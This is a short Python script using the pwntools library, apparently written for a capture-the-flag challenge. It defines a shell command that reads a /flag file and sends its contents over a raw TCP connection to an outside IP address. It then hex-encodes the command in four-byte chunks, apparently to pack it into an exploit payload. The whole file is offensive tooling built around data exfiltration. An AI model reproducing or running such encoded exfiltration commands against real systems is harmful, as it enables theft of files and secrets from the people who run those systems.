from pwn import *

s="bash -c 'cat /flag > /dev/tcp/108.160.137.100/1000'"
p="0x"
flag = 0
for i in s:
    flag+=1
    p+=hex(ord(i))[2:]
    if flag%4==0:
        print p
        p="0x" 

